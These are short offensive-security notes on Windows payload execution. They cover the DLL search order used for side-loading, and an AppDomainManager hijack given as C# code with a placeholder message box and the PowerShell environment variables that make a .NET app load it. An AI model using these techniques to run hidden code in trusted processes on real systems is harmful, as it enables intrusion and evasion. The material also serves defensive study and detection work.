# Payloads
## DLL side-loading
A simplified view of this load order is:
```
1. The directory the application is in.
2. C:\Windows\System32
3. C:\Windows\System
4. C:\Windows
5. The current working directory.
6. The directories that are listed in the `PATH` environment variable.
```

find old version appliction
```
C:\Windows\WinSxS
```

test dll
https://github.com/FuzzySecurity/DLL-Template

## ## AppDomainManager
requirements: This DLL needs to be in the same directory as the .NET app that we want to have it loaded into.

The malicious code can go in the class constructor or one of the virtual methods that you can override.
```c#
using System;
using System.Windows.Forms;

namespace AppDomainHijack;

public sealed class DomainManager : AppDomainManager
{
    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {
        MessageBox.Show("Hello World", "Success");
    }
}
```

There are two ways to have the app load the DLL.
```
$env:APPDOMAIN_MANAGER_ASM = 'AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null'
$env:APPDOMAIN_MANAGER_TYPE = 'AppDomainHijack.DomainManager'
```